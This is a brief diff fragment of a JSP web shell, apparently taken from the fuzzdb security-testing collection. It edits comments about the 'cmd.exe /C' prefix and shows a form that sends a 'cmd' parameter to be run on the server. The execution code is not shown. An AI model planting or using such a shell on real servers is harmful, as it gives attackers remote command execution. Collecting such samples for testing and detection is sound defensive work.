@@ -1,5 +1,5 @@
-// note that linux = cmd and windows = "cmd.exe /c + cmd" 
-
+<%-- from fuzzdb-webshell --%>
+<%-- Note: that for linux you need to remove "cmd.exe /C " and let ony cmd --%>
 <FORM METHOD=GET ACTION='cmdjsp.jsp'>
 <INPUT name='cmd' type=text>
 <INPUT type=submit value='Run'>
